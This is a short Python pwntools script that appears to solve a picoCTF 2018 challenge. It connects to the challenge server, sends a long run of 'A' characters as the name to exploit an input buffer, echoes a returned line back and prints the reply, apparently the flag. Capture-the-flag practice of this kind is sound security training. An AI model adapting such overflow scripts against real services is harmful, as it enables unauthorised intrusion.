from pwn import *

r = remote('2018shell1.picoctf.com', 57659)

r.sendlineafter('What is your name?\n', 'A' * 0xfe)

r.recvline()
r.sendline(r.recvline())

r.recvline()
print(r.recvline())

r.close()
